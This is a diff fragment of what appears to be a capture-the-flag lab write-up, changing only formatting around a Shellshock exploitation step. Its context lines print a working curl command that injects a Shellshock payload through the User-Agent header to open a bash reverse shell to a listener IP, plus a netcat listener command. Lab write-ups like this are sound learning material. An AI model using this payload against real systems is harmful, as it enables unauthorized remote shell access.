@@ -23,7 +23,8 @@ http://10.10.10.56/cgi-bin/user.sh
 To get a reverse shell I changed it to this: </br>
 ```bash
 curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.32/1234 0>&1" http://10.10.10.65/cgi-bin/user.sh
-``` </br>
+``` 
+</br>
 
 And opened a netcat listener on another terminal with: ```nc -nlvp 1234``` </br>
 And it worked: </br>
